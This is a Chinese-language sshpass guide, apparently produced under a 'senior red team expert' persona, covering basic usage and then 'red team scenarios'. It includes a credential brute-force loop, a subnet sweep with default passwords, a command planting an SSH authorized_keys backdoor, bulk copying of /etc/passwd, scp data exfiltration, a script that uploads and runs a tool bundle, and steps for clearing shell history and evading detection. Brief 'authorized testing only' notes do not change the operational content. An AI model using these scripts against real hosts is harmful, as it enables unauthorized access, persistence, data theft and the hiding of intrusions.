# 🔐 sshpass 使用指南

## ✅ 安装成功

- **工具**: sshpass
- **版本**: 1.10-0.1
- **位置**: /usr/bin/sshpass
- **安装时间**: 2025-10-20

---

## 📝 工具说明

sshpass 是一个非交互式 SSH 密码认证工具，允许在脚本中自动化 SSH 登录过程，无需手动输入密码。

**主要用途**：
- 批量 SSH 访问
- 自动化部署脚本
- 凭据验证测试
- 横向移动模拟
- 红队演习中的自动化访问

---

## 🚀 基本用法

### 1. 使用密码直接连接
```bash
sshpass -p 'your_password' ssh user@host
```

### 2. 从文件读取密码
```bash
# 创建密码文件
echo 'your_password' > password.txt
chmod 600 password.txt

# 使用密码文件连接
sshpass -f password.txt ssh user@host
```

### 3. 从环境变量读取密码
```bash
export SSHPASS='your_password'
sshpass -e ssh user@host
```

### 4. 执行远程命令
```bash
sshpass -p 'password' ssh user@host 'ls -la'
sshpass -p 'password' ssh user@host 'uname -a'
sshpass -p 'password' ssh user@host 'whoami'
```

### 5. SCP 文件传输
```bash
# 上传文件
sshpass -p 'password' scp file.txt user@host:/tmp/

# 下载文件
sshpass -p 'password' scp user@host:/remote/file.txt ./local/
```

### 6. 批量连接多台主机
```bash
#!/bin/bash
# batch_ssh.sh

hosts=("192.168.1.10" "192.168.1.11" "192.168.1.12")
user="admin"
password="admin123"

for host in "${hosts[@]}"; do
    echo "连接到 $host ..."
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$user@$host" 'hostname'
done
```

---

## 🔧 高级用法

### 1. 禁用主机密钥检查（仅测试环境）
```bash
sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@host
```

### 2. 指定 SSH 端口
```bash
sshpass -p 'password' ssh -p 2222 user@host
```

### 3. 使用密钥 + 密码（密钥有密码保护）
```bash
sshpass -p 'key_password' ssh -i ~/.ssh/id_rsa user@host
```

### 4. 组合 timeout 命令
```bash
timeout 10 sshpass -p 'password' ssh user@host 'long_command'
```

### 5. 批量凭据测试
```bash
#!/bin/bash
# credential_test.sh

target="192.168.1.100"
usernames=("admin" "root" "user")
passwords=("admin" "123456" "password")

for user in "${usernames[@]}"; do
    for pass in "${passwords[@]}"; do
        echo "测试: $user:$pass"
        if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
           -o ConnectTimeout=3 "$user@$target" 'exit' 2>/dev/null; then
            echo "✅ 成功: $user:$pass"
        fi
    done
done
```

---

## 🎯 红队应用场景

### 1. 横向移动
```bash
# 在获得凭据后快速横向移动
sshpass -p 'compromised_pass' ssh admin@internal_server
```

### 2. 批量侦察
```bash
#!/bin/bash
# 内网主机侦察

for ip in 192.168.1.{1..254}; do
    timeout 2 sshpass -p 'default_pass' ssh -o StrictHostKeyChecking=no \
        root@$ip 'hostname && ip a' 2>/dev/null && echo "✅ $ip"
done
```

### 3. 自动化部署后门
```bash
# 部署 SSH 密钥后门
sshpass -p 'password' ssh user@target \
    "mkdir -p ~/.ssh && echo 'your_public_key' >> ~/.ssh/authorized_keys"
```

### 4. 批量命令执行
```bash
# 在多台主机执行相同命令
cat targets.txt | while read host; do
    sshpass -p 'password' ssh -o StrictHostKeyChecking=no root@$host \
        'cat /etc/passwd' > "${host}_passwd.txt"
done
```

### 5. 数据渗出
```bash
# 从目标系统提取数据
sshpass -p 'password' scp -r user@target:/var/log ./exfil_logs/
```

---

## ⚠️ 安全注意事项

### 1. 密码保护
```bash
# ❌ 不安全 - 密码在命令行可见
sshpass -p 'password' ssh user@host

# ✅ 更安全 - 使用环境变量
export SSHPASS='password'
sshpass -e ssh user@host
unset SSHPASS

# ✅ 最安全 - 使用密码文件
echo 'password' > /tmp/.pass
chmod 600 /tmp/.pass
sshpass -f /tmp/.pass ssh user@host
rm /tmp/.pass
```

### 2. 清理痕迹
```bash
# 清理 bash 历史
history -c
history -w

# 清理命令行参数（在脚本中）
set -- $(echo "$@" | sed 's/-p [^ ]*//')
```

### 3. 避免日志记录
```bash
# 使用空格开头的命令（某些 shell 配置下不记录历史）
 sshpass -p 'password' ssh user@host

# 或临时禁用历史
HISTFILE=/dev/null sshpass -p 'password' ssh user@host
```

---

## 📊 返回码

- **0**: 成功
- **1**: 无效命令行参数
- **2**: 冲突的参数
- **3**: 一般运行时错误
- **4**: 解析错误
- **5**: 密码错误或连接失败
- **6**: 主机公钥未知

### 检查返回码示例
```bash
sshpass -p 'password' ssh user@host 'command'
exit_code=$?

case $exit_code in
    0) echo "✅ 成功" ;;
    5) echo "❌ 认证失败或连接错误" ;;
    6) echo "⚠️  主机密钥未知" ;;
    *) echo "❌ 其他错误: $exit_code" ;;
esac
```

---

## 🛡️ 防御检测

### 常见检测特征
1. 大量失败的 SSH 登录尝试
2. 来自单一源 IP 的多次连接
3. 短时间内多次认证请求
4. 非常规时间的 SSH 连接
5. 使用常见默认凭据

### 规避建议（仅用于授权测试）
- 限制尝试速率
- 使用代理或跳板机
- 分散攻击时间
- 混合合法流量
- 使用已知好的凭据

---

## 🔗 相关工具

- **Hydra**: 并行暴力破解工具
- **Medusa**: 模块化暴力破解工具  
- **Ncrack**: Nmap项目的凭据破解工具
- **Patator**: Python多协议暴力破解工具

---

## 📚 实用脚本示例

### 自动化红队工具部署
```bash
#!/bin/bash
# deploy_tools.sh

TARGET="192.168.1.100"
USER="admin"
PASS="admin123"

echo "🚀 开始部署红队工具到 $TARGET ..."

# 1. 上传工具
sshpass -p "$PASS" scp -o StrictHostKeyChecking=no \
    ./tools.tar.gz "$USER@$TARGET:/tmp/"

# 2. 解压并设置
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$TARGET" << 'EOF'
cd /tmp
tar -xzf tools.tar.gz
chmod +x tools/*
./tools/setup.sh
EOF

echo "✅ 部署完成！"
```

---

## 🎓 最佳实践

1. **仅在授权测试中使用**
2. **使用密码文件而非命令行参数**
3. **及时清理凭据文件**
4. **结合其他安全工具使用**
5. **记录所有测试活动**
6. **遵守法律法规和职业道德**

---

**安装完成时间**: 2025-10-20  
**角色**: 🔴 高级红队专家 v3.0  
**用途**: SSH自动化、横向移动、凭据验证
